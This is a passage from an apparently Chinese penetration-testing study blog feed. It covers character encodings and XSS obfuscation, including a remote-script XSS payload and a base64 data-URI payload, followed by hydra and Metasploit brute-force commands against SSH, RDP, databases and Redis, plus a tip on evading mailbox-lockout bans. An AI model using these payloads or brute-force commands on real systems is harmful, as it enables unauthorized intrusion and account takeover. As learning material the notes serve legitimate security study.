%E5%AE%87%E5%AE%99</span><br></pre></td></tr></table></figure><p><strong>URL编码使用</strong></p><p>当地址栏直接输入url，或者页面内发起url请求，浏览器将对path和query部分能够识别的属于自动编码范围的字符进行自动URL编码，再进行请求。</p><p>1、浏览器无法自动识别对是url结构的字符，还是普通文本，对于这一部分字符如果要作为普通文本字符，必须手动设置url编码。</p><ul><li>比如路径部分的&#x2F;#?&#x3D;&amp;</li><li>比如参数部分的&amp;&#x3D;#</li><li>Ascii之内的控制字符，即0-31和127</li></ul><p>2、浏览器对ascii内完全不会引起安全问题的字符，不进行自动编码，也不要求编码。当然，手动编码也是可以正常请求的。</p><ul><li>Ascii之内的数字和字母，数字48-57，大写字母65-90，小写字母97-122不会进行编码。</li></ul><p>3、浏览器自动编码的范围包括：ascii之外的所有字符，ascii之内的部分字符</p><p>4、常见的几种浏览器Edge、firefox、chorm对自动编码前后的地址栏显示可能有所差异，但是请求中所进行的编码没有差异，自动编码范围相同。（IE对path和query编码有所差别，但近乎淘汰，暂时不考虑讨论）</p><p><strong>URL编码与表单</strong></p><p>当表单元素form的enctype为默认值，或者显式设置为application&#x2F;x-www-form-urlencoded时，请求头部字段为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>此时表单提交数据也会进行url编码，服务器接收后会根据该请求头部字段判断进行url解码。</p><p><strong>URL编码与XSS</strong></p><p>将字符进行URL编码，可以使得用户无法直观查看url，但又不影响请求。</p><h3 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h3><p>编码转换：<a href="http://www.jb51.net/tools/zhuanhuan.htm">http://www.jb51.net/tools/zhuanhuan.htm</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>常用的三种编码示例：</p><ul><li><p>javascript的十六进制编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x22\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x21\x22\x29\x3B\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E</span><br></pre></td></tr></table></figure></li><li><p>javascript的八进制编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="number">74</span>\<span class="number">163</span>\<span class="number">143</span>\<span class="number">162</span>\<span class="number">151</span>\<span class="number">160</span>\<span class="number">164</span>\<span class="number">76</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">145</span>\<span class="number">162</span>\<span class="number">164</span>\<span class="number">50</span>\<span class="number">42</span>\<span class="number">110</span>\<span class="number">145</span>\<span class="number">154</span>\<span class="number">154</span>\<span class="number">157</span>\<span class="number">40</span>\<span class="number">167</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">154</span>\<span class="number">144</span>\<span class="number">41</span>\<span class="number">42</span>\<span class="number">51</span>\<span class="number">73</span>\<span class="number">74</span>\<span class="number">57</span>\<span class="number">163</span>\<span class="number">143</span>\<span class="number">162</span>\<span class="number">151</span>\<span class="number">160</span>\<span class="number">164</span>\<span class="number">76</span></span><br></pre></td></tr></table></figure></li><li><p>javascript unicode编码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//源码</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.jpg&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xsst.sinaapp.com/m.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">http://1.com/1.swf</span>  <span class="attr">allowscriptaccess</span>=<span class="string">always</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//转换unicode编码</span><br><span class="line">\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0048\u0065\u006c\u006c\u006f\u0020\u0077\u006f\u0072\u006c\u0064\u0021\u0022\u0029\u003b\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0020</span><br></pre></td></tr></table></figure></li></ul><h3 id="HEX编码"><a href="#HEX编码" class="headerlink" title="HEX编码"></a>HEX编码</h3><p>这种编码常用于数据库中 转码过后要加上0x</p><p>例如 a的hex码是61 如果在数据库使用要加上0x61 </p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071642067.png" alt="image-20240122162014609"></p><h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p>BASE64 编码是一种常用的字符编码，在很多地方都会用到。但base64不是安全领域下的加密解密算法。能起到安全作用的效果很差，而且很容易破解，他核心作用应该是传输数据的正确性，有些网关或系统只能使用ASCII字符。Base64就是用来将非ASCII字符的数据转换成ASCII字符的一种方法，而且base64特别适合在http，mime协议下快速传输数据。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="json编码"><a href="#json编码" class="headerlink" title="json编码"></a>json编码</h3><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式，易于阅读和编写，同时也易于机器解析和生成。它基于ECMA262语言规范（1999-12第三版）中JavaScript编程语言的一个子集。 JSON采用与编程语言无关的文本格式，但是也使用了类C语言（包括C， C++， C#， Java， JavaScript， Perl， Python等）的习惯，这些特性使JSON成为理想的数据交换格式。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//json格式</span></span><br><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Number&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Contno&quot;</span><span class="punctuation">:</span> <span class="string">&quot;000&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;QQNo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Number&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Contno&quot;</span><span class="punctuation">:</span> <span class="string">&quot;000&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;QQNo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;a1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Number&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Contno&quot;</span><span class="punctuation">:</span> <span class="string">&quot;000&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;QQNo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//json 转换 php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span>=<span class="string">&#x27;[&#123;&quot;Name&quot;:&quot;a1&quot;,&quot;Number&quot;:&quot;123&quot;,&quot;Contno&quot;:&quot;000&quot;,&quot;QQNo&quot;:&quot;&quot;&#125;,&#123;&quot;Name&quot;:&quot;a1&quot;,&quot;Number&quot;:&quot;123&quot;,&quot;Contno&quot;:&quot;000&quot;,&quot;QQNo&quot;:&quot;&quot;&#125;,&#123;&quot;Name&quot;:&quot;a1&quot;,&quot;Number&quot;:&quot;123&quot;,&quot;Contno&quot;:&quot;000&quot;,&quot;QQNo&quot;:&quot;&quot;&#125;]&#x27;</span>; </span><br><span class="line"><span class="variable">$json</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$data</span>); </span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$json</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化格式 a:3:&#123;i:0;s:3:&quot;Moe&quot;;i:1;s:5:&quot;Larry&quot;;i:2;s:5:&quot;Curly&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$stooges</span> = <span class="keyword">array</span>(<span class="string">&#x27;Moe&#x27;</span>,<span class="string">&#x27;Larry&#x27;</span>,<span class="string">&#x27;Curly&#x27;</span>);</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$stooges</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$new</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//第一行序列化，第二行转为数组</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071642888.png" alt="image-20240122164018040"></p><h3 id="utf7编码"><a href="#utf7编码" class="headerlink" title="utf7编码"></a>utf7编码</h3><p>UTF-7 (7-位元 Unicode 转换格式（Unicode Transformation Format，简写成 UTF））是一种可变长度字符编码方式， 用以将 Unicode 字符以 ASCII 编码的字符串来呈现，可以应用在电子邮件传输之类的应用。</p><p>编码工具：<a href="https://web2hack.org/xssee/">https://web2hack.org/xssee/</a></p><p>示例：</p><p>源码：<code>ceshi</code></p><p>编码：<code>+AGM-e+AHMAaA-i</code></p><p>解码：<code>ceshi</code></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>穷举篇</title>
      <link href="/post/4eaf266d.html"/>
      <url>/post/4eaf266d.html</url>
      
        <content type="html"><![CDATA[<h1 id="穷举篇"><a href="#穷举篇" class="headerlink" title="穷举篇"></a>穷举篇</h1><h2 id="文件和目录穷举"><a href="#文件和目录穷举" class="headerlink" title="文件和目录穷举"></a>文件和目录穷举</h2><ul><li><strong>Pker多线程后台极速扫描工具V2.01修正版</strong></li><li><strong>御剑</strong></li><li><strong>dirbuster</strong></li></ul><h2 id="常见的端口服务"><a href="#常见的端口服务" class="headerlink" title="常见的端口服务"></a>常见的端口服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">这些是计算机网络中常见的端口号和对应的服务。下面是对每个端口号的解释：</span><br><span class="line"></span><br><span class="line">- HTTP (80)：超文本传输协议，用于在Web浏览器和服务器之间传输HTML页面和其他数据。</span><br><span class="line">- HTTPS (443)：安全的HTTP协议，使用SSL/TLS加密来保护数据传输的安全性。</span><br><span class="line">- FTP (21)：文件传输协议，用于在网络上进行文件的上传和下载。</span><br><span class="line">- SSH (22)：安全外壳协议，用于远程登录到服务器并执行命令。</span><br><span class="line">- MySQL (3306)：关系型数据库管理系统，用于存储和管理数据。</span><br><span class="line">- MSSQL (1433)：Microsoft SQL Server数据库的默认端口号。</span><br><span class="line">- Rsync (873)：远程同步协议，用于在计算机之间同步文件和目录。</span><br><span class="line">- Oracle (1521)：Oracle数据库的默认端口号。</span><br><span class="line">- MongoDB (27017)：NoSQL数据库，用于存储和检索非结构化数据。</span><br><span class="line">- Redis (6379)：内存数据结构存储系统，用于缓存和存储数据。</span><br><span class="line">- Tomcat (8080)：Java Web服务器，用于托管Java Web应用程序。</span><br><span class="line">- SMTP (25)：简单邮件传输协议，用于发送电子邮件。</span><br><span class="line">- POP3 (110)：邮局协议版本3，用于接收电子邮件。</span><br><span class="line">- DNS (53)：域名系统，用于将域名解析为IP地址。</span><br><span class="line">- Telnet (23)：远程终端协议，用于通过网络连接到远程主机。</span><br><span class="line">- VNC (5900)：虚拟网络计算，用于远程桌面共享和远程控制。</span><br><span class="line">- PCAnywhere (5632)：远程访问软件，用于远程控制计算机。</span><br><span class="line">- Apache/Tomcat/Nginx/Axis2/resin/jboss (80|8080)：Web服务器和应用程序服务器，用于托管Web应用程序。</span><br><span class="line">- WebLogic (7001)：Java应用服务器，用于部署和运行Java应用程序。</span><br><span class="line">- Jenkins (8080, 8089)：持续集成和持续交付工具，用于自动化构建、测试和部署软件。</span><br><span class="line">- SNMP (161)：简单网络管理协议，用于监控和管理网络设备。</span><br><span class="line">- Zabbix (8069)：监控系统，用于收集和分析网络设备的性能指标。</span><br><span class="line">- Elasticsearch (9200, 9300)：分布式搜索和分析引擎，用于存储和检索大量数据。</span><br><span class="line">- RDP (3389)：远程桌面协议，用于远程桌面连接和远程操作。</span><br></pre></td></tr></table></figure><h2 id="常见端口服务穷举"><a href="#常见端口服务穷举" class="headerlink" title="常见端口服务穷举"></a>常见端口服务穷举</h2><p><strong>穷举爆破神器hydra</strong></p><p><strong>下载地址：</strong><a href="https://www.thc.org/">https://www.thc.org/</a>或<a href="https://www.thc.org/releases/hydra-8.4.tar.gz">https://www.thc.org/releases/hydra-8.4.tar.gz</a></p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071640545.png" alt="image-20240131173007486"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">使用示例：</span><br><span class="line">破解SSH密码使用字典对目标服务进行破解：hydra -L users.txt -P password.txt ssh://127.0.0.1</span><br><span class="line">当目标服务开放的端口不是默认端口时，使用 -s 进行指定：hydra  -L user.txt -P password.txt  ssh://127.0.0.1  -s 77744</span><br><span class="line">将破解的密码存储到指定文件：hydra  -L users.txt -P password.txt  ssh://127.0.0.1  -s 40 -o ssh.txt</span><br><span class="line"></span><br><span class="line"> hydra破解不同协议的密码：</span><br><span class="line"> ​#破解ssh:        hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh</span><br><span class="line">#破解https：     hydra -m /index.php -l username -P pass.txt IP https</span><br><span class="line">#破解teamspeak： hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</span><br><span class="line">#破解cisco：     hydra -P pass.txt IP cisco</span><br><span class="line"> hydra -m cloud -P pass.txt 127.0.0.1 cisco-enable</span><br><span class="line">#破解smb：       hydra -l administrator -P pass.txt IP smb</span><br><span class="line">#破解pop3：      hydra -l muts -P pass.txt my.pop3.mail pop3</span><br><span class="line">#破解rdp：       hydra IP rdp -l administrator -P pass.txt -V          </span><br><span class="line">#破解http-proxy: hydra -l admin -P pass.txt http-proxy://127.0.0.1  </span><br><span class="line">#破解telnet:     hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</span><br><span class="line">#破解ftp:       hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV</span><br><span class="line">#get方式提交，破解web登录: </span><br><span class="line"> hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV</span><br><span class="line"> hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns IP http-get /admin/</span><br><span class="line"> hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f IP http-get /admin/index.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">参数中文解释：</span><br><span class="line">-R 继续从上一次进度接着破解。</span><br><span class="line">-S 采用SSL链接。</span><br><span class="line">-s PORT 可通过这个参数指定非默认端口。</span><br><span class="line">-l LOGIN 指定破解的用户，对特定用户破解。</span><br><span class="line">-L FILE 指定用户名字典。</span><br><span class="line">-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</span><br><span class="line">-P FILE 大写，指定密码字典。</span><br><span class="line">-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</span><br><span class="line">-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</span><br><span class="line">-M FILE 指定目标列表文件一行一条。</span><br><span class="line">-o FILE 指定结果输出文件。</span><br><span class="line">-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t TASKS 同时运行的线程数，默认为16。</span><br><span class="line">-w TIME 设置最大超时的时间，单位秒，默认是30s。</span><br><span class="line">-v / -V 显示详细过程。</span><br><span class="line"></span><br><span class="line">另一个版本示例：</span><br><span class="line">1. **SSH**</span><br><span class="line">hydra -L /root/user -P /root/passwd ssh://192.168.1.0 -f -o /root/crack.txt -V</span><br><span class="line">这条命令试图通过SSH协议暴力破解192.168.1.0主机上的用户账户。-L 参数指定用户名列表文件路径（这里是/root/user），-P 参数指定密码列表文件路径（这里是/root/passwd）。-f 表示在找到有效的凭据后立即停止攻击，-o 指定输出文件（成功登录的用户名和密码会记录在此处），-V 则表示详细模式，显示进度信息。</span><br><span class="line"></span><br><span class="line">2. **FTP**</span><br><span class="line">hydra -L /root/user -P /root/passwd ftp://192.168.1.0 -f -o /root/crack.txt -V</span><br><span class="line">类似于上一条，这条命令针对的是FTP服务，尝试暴力破解192.168.1.0主机的FTP登录凭据。</span><br><span class="line"></span><br><span class="line">3. **RDP**</span><br><span class="line">hydra -L /root/user -P /root/passwd rdp://192.168.1.0 -f -o /root/crack.txt -V</span><br><span class="line">此命令针对的是Windows远程桌面协议(RDP)，尝试暴力破解192.168.1.0主机的RDP登录凭证。</span><br><span class="line"></span><br><span class="line">4. **MSSQL**</span><br><span class="line">hydra -L /root/user -P /root/passwd mssql://192.168.0.129 -f -o /root/crack.txt -v</span><br><span class="line">这条命令用于暴力破解Microsoft SQL Server（MSSQL）数据库，尝试登录至192.168.0.129主机的数据库实例。</span><br><span class="line"></span><br><span class="line">5. **MySQL**</span><br><span class="line">hydra -L /root/user -P /root/passwd mysql://192.168.0.129 -f -o /root/crack.txt –v -s 3306</span><br><span class="line">此命令针对MySQL数据库服务，通过TCP端口3306对192.168.0.129主机进行暴力破解。</span><br><span class="line"></span><br><span class="line">6. **Oracle**</span><br><span class="line">hydra -P /root/passwd oracle://192.168.0.129 -f -o /root/crack.txt –v</span><br><span class="line">这条命令针对Oracle数据库服务，尝试登录至192.168.0.129主机的Oracle实例，只提供了密码列表（没有列出用户名列表）。</span><br><span class="line"></span><br><span class="line">7. **Redis**</span><br><span class="line">hydra -P /root/passlist.txt -e nsr -t 16 192.168.0.101 redis</span><br><span class="line">对Redis服务进行暴力破解，仅使用密码列表，启用大小写不敏感(-e nsr)及所有特殊字符，并使用16个并发线程尝试破解192.168.0.101主机上的Redis实例。</span><br><span class="line"></span><br><span class="line">8. **PostgreSQL**</span><br><span class="line">hydra -P /root/passlist.txt -e nsr -t 16 192.168.0.101 postgresql</span><br><span class="line">同样是对数据库服务进行破解，这次针对的是PostgreSQL，使用相同的设置（密码列表、大小写不敏感和特殊字符）以及16个并发线程尝试登录192.168.0.101主机上的PostgreSQL数据库。</span><br><span class="line"></span><br><span class="line">9. **指定多个IP进行穷举**</span><br><span class="line">hydra -L /root/user -P /root/passlist -M /root/ip.txt -V -o /root/crack mysql -t 16</span><br><span class="line">使用多个IP地址进行MySQL服务的暴力破解，其中-L 和 -P 分别指定了用户名和密码列表，-M 指定了包含目标IP地址的文件，-V 显示详细信息，-o 输出文件名，-t 指定了并发线程数为16。</span><br></pre></td></tr></table></figure><h2 id="kali-metasploit-穷举模块使用"><a href="#kali-metasploit-穷举模块使用" class="headerlink" title="kali metasploit 穷举模块使用"></a>kali metasploit 穷举模块使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">这些是Metasploit框架中的各种扫描辅助模块，用于检测不同类型的服务（如FTP、SSH、Telnet等）的登录凭据是否存在弱密码或默认密码。通过使用这些模块，攻击者可以对目标系统进行暴力破解攻击，以获取访问权限。模块示例：</span><br><span class="line">auxiliary/scanner/ftp/ftp_login</span><br><span class="line">auxiliary/scanner/ssh/ssh_login</span><br><span class="line">auxiliary/scanner/telnet/telnet_login</span><br><span class="line">auxiliary/scanner/smb/smb_login</span><br><span class="line">auxiliary/scanner/mssql/mssql_login</span><br><span class="line">auxiliary/scanner/mysql/mysql_login</span><br><span class="line">auxiliary/scanner/oracle/oracle_login</span><br><span class="line">auxiliary/scanner/postgres/postgres_login</span><br><span class="line">auxiliary/scanner/vnc/vnc_login</span><br><span class="line">auxiliary/scanner/pcanywhere/pcanywhere_login</span><br><span class="line">auxiliary/scanner/snmp/snmp_login</span><br><span class="line"></span><br><span class="line">msfconsole//启动metasploit模块</span><br><span class="line">help</span><br><span class="line"># 查看所有核心命令的帮助摘要</span><br><span class="line">msf6 &gt; help</span><br><span class="line"># 查看某一核心命令的详细帮助</span><br><span class="line">msf6 &gt; help &lt;command&gt;</span><br><span class="line"># 例如，查看 `use` 命令的帮助</span><br><span class="line">msf6 &gt; help use</span><br><span class="line"># 查看模块相关的命令帮助</span><br><span class="line">msf6 &gt; show modules</span><br><span class="line"># 查看特定模块的帮助</span><br><span class="line">msf6 &gt; show module &lt;module_path&gt; -h</span><br><span class="line"># 示例，查看一个exploit模块的帮助</span><br><span class="line">msf6 &gt; show module exploits/windows/smb/ms08_067_netapi -h</span><br><span class="line">set: 这个命令用于设置模块的参数例如</span><br><span class="line">show options: 这个命令用于显示当前模块的所有设置和参数。</span><br><span class="line">back: 这个命令用于返回到上一级菜单或模块。</span><br><span class="line">info: 这个命令用于显示当前模块的信息，包括描述、作者、参考链接等。</span><br><span class="line">exploit/run: 这个命令用于运行当前选中的模块。在Metasploit中，模块可以是auxiliary（辅助模块）、exploit（利用模块）或post（后期利用模块）。</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">#这段代码是在使用Metasploit框架（msfconsole）时，选择了名为&quot;ssh_login&quot;的SSH登录扫描辅助模块。这个模块用于检测SSH服务器上是否存在弱密码或默认密码，以进行暴力破解攻击。</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; info</span><br><span class="line">#显示当前模块的信息，包括描述、作者、参考链接等。</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 192.168.3.106</span><br><span class="line">RHOSTS =&gt; 192.168.3.106#设置目标主机IP地址为192.168.3.106</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME root</span><br><span class="line">USERNAME =&gt; root#设置用户名为root</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /root/passwd.txt</span><br><span class="line">PASS_FILE =&gt; /root/passwd.txt设置密码文件路径为/root/passwd.txt，该文件中包含了用于暴力破解的密码列表</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; show options#显示当前模块的所有设置和参数。</span><br></pre></td></tr></table></figure><h2 id="邮箱穷举"><a href="#邮箱穷举" class="headerlink" title="邮箱穷举"></a>邮箱穷举</h2><p><strong>MailCracker工具</strong>：D:\xinan\穷举工具\穷举工具\穷举工具\MailCracker_Trial</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641884.png" alt="image-20240201145917034"></p><p><strong>通用邮箱穷举</strong></p><p>使用脚本来进行字典不能太多最好10个以内不然会被封ip</p><h2 id="网站篇"><a href="#网站篇" class="headerlink" title="网站篇"></a>网站篇</h2><p><strong>burpsuite 通用破解方法</strong>：<strong>网站会员批量登录穷举、指定后台密码穷举</strong></p><p>打开burpsuite并且设置代理</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641766.png" 